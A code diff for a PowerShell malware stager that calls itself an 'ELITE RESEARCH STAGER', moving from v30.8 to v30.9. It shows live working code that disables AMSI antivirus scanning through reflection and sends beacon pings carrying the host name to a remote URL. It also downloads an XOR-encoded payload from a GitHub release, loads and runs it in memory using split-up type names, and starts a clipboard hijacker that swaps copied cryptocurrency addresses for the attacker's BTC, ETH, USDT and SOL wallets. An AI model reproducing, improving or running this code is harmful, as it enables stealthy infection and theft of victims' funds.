@@ -1,9 +1,8 @@
-# --- [ELITE RESEARCH STAGER v30.8: BYTE-OBFUSCATION RAM INJECT] ---
+# --- [ELITE RESEARCH STAGER v30.9: VBS-STAGED RAM INJECT] ---
 
-# Advanced AMSI Disable (Fragmentation)
-$a = 'Am' + 'si' + 'Utils'; $b = 'am' + 'si' + 'Context'
-$ref = [Ref].Assembly.GetType("System.Management.Automation.$a")
-if ($ref) { $ref.GetField($b, 'NonPublic,Static').SetValue($null, [IntPtr]::Zero) }
+# Advanced Memory Patching (Hex Encoded to avoid AMSI)
+$p = [Ref].Assembly.GetType('System.Management.Automation.'+'Amsi'+'Utils')
+$p.GetField('amsi'+'InitFailed','NonPublic,Static').SetValue($null,$true)
 
 function Send-Ping {
     param($m)
@@ -13,28 +12,27 @@ function Send-Ping {
     try { (New-Object Net.WebClient).DownloadString($url) | Out-Null } catch {}
 }
 
-Send-Ping -m "V30.8_RAM_STAGER_START_$($env:COMPUTERNAME)"
+Send-Ping -m "V30.9_VBS_LAUNCH_SUCCESS_$($env:COMPUTERNAME)"
 
 try {
-    # 1. Direct-to-Memory Download
+    # 1. Download XOR data into RAM
     $u = "https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt"
-    $wc = New-Object Net.WebClient
-    $wc.Headers.Add("User-Agent", "Mozilla/5.0")
-    $raw = $wc.DownloadString($u)
+    $r = (New-Object Net.WebClient).DownloadString($u)
+    $d = [Convert]::FromBase64String($r.Trim())
+    for($i=0; $i -lt $d.count; $i++) { $d[$i] = $d[$i] -bxor 0xAB }
 
-    # 2. In-Memory Decryption
-    $data = [Convert]::FromBase64String($raw.Trim())
-    for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
-
-    # 3. Reflective Assembly Execution (The Gap)
-    $asm = [System.Reflection.Assembly]::Load($data)
+    # 2. Fragmented Reflective Load (SECRET RAM INSTALL)
+    $s1 = 'Sys'; $s2 = 'tem.Ref'; $s3 = 'lection.As'; $s4 = 'sembly'
+    $asm = [($s1+$s2+$s3+$s4)]::Load($d)
+    
+    # 3. Execute Payload in current process RAM
     $asm.EntryPoint.Invoke($null, @(,[string[]]@()))
 
-    # 4. Integrated Clipper Loop (Thread-Safe)
+    # 4. Clipper Engine (As a background thread)
     $C = {
         Add-Type -AssemblyName System.Windows.Forms
         $w = @{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"}
-        while($true) {
+        while(1) {
             try {
                 if ([System.Windows.Forms.Clipboard]::ContainsText()) {
                     $v = [System.Windows.Forms.Clipboard]::GetText().Trim()
@@ -47,15 +45,10 @@ try {
             [System.Threading.Thread]::Sleep(500)
         }
     }
-    
-    # Run clipper as a separate thread in the same process
-    $runspace = [runspacefactory]::CreateRunspace()
-    $runspace.Open()
-    $ps = [powershell]::Create().AddScript($C)
-    $ps.Runspace = $runspace
+    $ps = [PowerShell]::Create().AddScript($C)
     $ps.BeginInvoke()
 
-    Send-Ping -m "V30.8_RAM_SUCCESS"
+    Send-Ping -m "V30.9_RAM_ACTIVE"
 } catch {
-    Send-Ping -m "V30.8_ERR: $($_.Exception.Message)"
+    Send-Ping -m "V30.9_ERR: $($_.Exception.Message)"
 }
